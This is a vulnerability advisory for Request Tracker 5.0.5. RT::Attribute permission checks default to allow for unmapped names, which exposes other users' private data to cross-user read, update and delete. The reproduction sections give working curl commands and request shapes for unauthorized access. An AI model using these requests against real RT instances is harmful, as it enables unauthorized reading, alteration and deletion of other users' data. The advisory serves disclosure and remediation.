# TTA-2026-004: Request Tracker 5.0.5 RT::Attribute authorization defaults to allow for unmapped attribute types

**Severity: High** — Suggested CVSS 3.1: 8.3 (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L`)

### Title

Fail-open `RT::Attribute` authorization allows cross-user and system-level read, update, and delete operations.

### Summary

Request Tracker 5.0.5 implements `RT::Attribute` permission lookup using an ACL map that explicitly covers `SavedSearch`, but returns the literal result `allow` for unmapped Attribute names. Consumers that load an Attribute by numeric identifier without a separate ownership check therefore treat display, update, and delete operations as authorized for names such as `Dashboard`, `UserLogo`, `Subscription`, and `DefaultDashboard`.

In an isolated RT 5.0.5 instance, this root cause was used to:

- read another user's private Attribute description and scalar content;
- update another user's private Dashboard Attribute;
- delete another user's private UserLogo Attribute; and
- modify a system-level `DefaultDashboard` Attribute.

These effects share the same fail-open authorization root cause and are presented as one CVE request unless the assigning CNA determines that individual consumer paths are independently fixable vulnerabilities.


### Affected Version

- Vendor: Best Practical Solutions, LLC
- Product: Request Tracker
- Confirmed affected version: 5.0.5
- Core component: `lib/RT/Attribute.pm`, including `LookupObjectRight` and its ACL map
- Demonstrated consumers:
  - `/Prefs/Search.html?name=RT::Attribute-<id>`
  - `share/html/Widgets/SavedSearch`, reachable through `/Search/Chart.html`

Only RT 5.0.5 was dynamically tested. Other versions have not been claimed as affected without separate verification.


### Vulnerability Type

Incorrect Authorization / Fail-Open Access Control (CWE-863, CWE-862, CWE-639).

### Affected Code

Files: `lib/RT/Attribute.pm`, `/Prefs/Search.html`, and `share/html/Widgets/SavedSearch`.

Affected operations include Attribute read, update, and delete paths that accept a numeric Attribute identifier.

### Root Cause

The `RT::Attribute` ACL map defines permissions for only a limited set of Attribute names. `LookupObjectRight` returns `allow` when a name or operation is not mapped, and `CurrentUserHasRight` accepts that result without a per-object fallback. Separately, the demonstrated consumers load Attributes by numeric identifier without consistently checking the Attribute's owner or container.


### Steps to Reproduce
#### Reproduction: unauthorized read

1. Deploy RT 5.0.5 in a disposable lab instance and set `RT_BASE` to the lab URL, such as `http://127.0.0.1/rt`.
2. Create synthetic users `attacker` and `victim`.
3. Create victim-owned `Dashboard` and `UserLogo` Attributes containing harmless markers such as `SYNTHETIC-DASHBOARD-CANARY`.
4. Confirm the attacker has no ownership, `AdminUsers`, or SuperUser rights over the victim. Log in as the synthetic attacker and export the lab-only session to `attacker.jar`.
5. Request the victim-owned Dashboard Attribute:

   ```text
   GET /Prefs/Search.html?name=RT::Attribute-<SYNTHETIC_DASHBOARD_ATTRIBUTE_ID>
   ```

   ```bash
   curl -sS -b attacker.jar \
     "$RT_BASE/Prefs/Search.html?name=RT%3A%3AAttribute-<SYNTHETIC_DASHBOARD_ATTRIBUTE_ID>" \
     -o dashboard-read.html
   ```

6. Vulnerable result: `dashboard-read.html` contains `SYNTHETIC-DASHBOARD-CANARY` in the rendered description.
7. Repeat with the synthetic `UserLogo` Attribute and record whether its marker is exposed.
8. Repeat with a mapped `SavedSearch` Attribute as a negative control; it should be denied. Remove the synthetic test data afterward.


#### Reproduction: unauthorized update and delete

1. Use the same non-administrator attacker and a restorable synthetic victim Attribute.
2. Submit the normal SavedSearch widget save action with a synthetic Attribute identifier and harmless marker. URL-encode the colon characters in the saved-search reference:

   ```text
   GET /Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchSave=1&SavedSearchDescription=SYNTHETIC-UPDATED-CANARY
   ```

   ```bash
   curl -sS -b attacker.jar -G "$RT_BASE/Search/Chart.html" \
     --data-urlencode 'SavedSearchLoad=RT::User-<SYNTHETIC_VICTIM_ID>-SavedSearch-<SYNTHETIC_ATTRIBUTE_ID>' \
     --data-urlencode 'SavedSearchSave=1' \
     --data-urlencode 'SavedSearchDescription=SYNTHETIC-UPDATED-CANARY' \
     -o update-result.html
   ```

3. Vulnerable result: the request succeeds and the lab database or victim's owner view shows `SYNTHETIC-UPDATED-CANARY` as the new Dashboard description.
4. Submit the corresponding delete action for a separate synthetic UserLogo Attribute:

   ```text
   GET /Search/Chart.html?SavedSearchLoad=RT%3A%3AUser-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchDelete=1
   ```

   ```bash
   curl -sS -b attacker.jar -G "$RT_BASE/Search/Chart.html" \
     --data-urlencode 'SavedSearchLoad=RT::User-<SYNTHETIC_VICTIM_ID>-SavedSearch-<SYNTHETIC_ATTRIBUTE_ID>' \
     --data-urlencode 'SavedSearchDelete=1' \
     -o delete-result.html
   ```

5. Vulnerable result: the synthetic `UserLogo` row is deleted. Verify by synthetic Attribute ID, then restore the lab database snapshot.
6. Repeat against a restorable system `DefaultDashboard` canary and verify whether the system value changes.
7. Repeat with an actual `SavedSearch` Attribute as a negative control; the explicit mapping should deny the operation.

Generic request shapes used in the isolated test were:

```text
GET /Search/Chart.html?SavedSearchLoad=RT::User-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchSave=1&SavedSearchDescription=<CANARY>

GET /Search/Chart.html?SavedSearchLoad=RT::User-<VICTIM_ID>-SavedSearch-<ATTRIBUTE_ID>&SavedSearchDelete=1
```


### Impact

Depending on the reachable consumer and the Attribute name, an authenticated user can cross user or system boundaries to read, modify, or delete Attribute-backed configuration and private user data. Demonstrated impact includes private Dashboard metadata and content, UserLogo content, deletion of private Attribute records, and modification of the instance-wide default dashboard.

The write and delete effects require access to the affected staff-facing page in the reproduced scenario. The `/Prefs/Search.html` read effect was reproduced with an ordinary authenticated account and no administrative rights over the victim user.


### CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L` — 8.3 High.

## Status

Privately reported to Best Practical on 2026-10-23 and publicly disclosed on 2026-10-24. No vendor response or CVE assignment had been received at the time of publication.

## Recommended remediation

- Change the default for unknown Attribute names and operations from allow to deny.
- Define an explicit permission mapping for every supported Attribute name.
- Add a per-instance ownership/container authorization check below the name mapping.
- Require consumer pages to use a centralized authorized Attribute loader instead of raw `Load` or `LoadById` calls.
- Prevent exception pages from including raw Attribute content.
- Add regression tests covering read, update, and delete for user-owned and system-owned Attributes, including mapped and unmapped names.

## Evidence boundary

All effects were dynamically reproduced only in an isolated RT 5.0.5 laboratory instance using synthetic accounts, Attributes, and restorable canaries. No customer hostname, IP address, credential, cookie, real user content, ticket, or production value is included in this advisory.
